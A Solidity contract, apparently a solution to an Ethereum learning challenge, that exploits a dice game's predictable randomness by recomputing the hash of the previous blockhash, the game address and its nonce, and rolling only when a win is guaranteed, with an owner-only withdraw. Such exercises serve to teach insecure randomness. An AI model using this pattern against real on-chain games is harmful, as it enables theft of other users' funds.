pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    
    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint _amount) onlyOwner public payable {
        
        require(
        (address(this).balance > 0) 
        && (_amount > 0) 
        && (address(this).balance > _amount)
        );

        (bool sent, bytes memory data) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
    
    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable onlyOwner {

        uint256 amount = 2000000000000000;

        require(address(this).balance >= amount, "Require more ETH to roll dice");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted dice roll will be: ", roll);

        require(roll <=2, "Dice Roll will be larger than 2");
        
        diceGame.rollTheDice{value: amount}();

    }

    //Add receive() function so contract can receive Eth
    receive() external payable {
    
    }

    
}
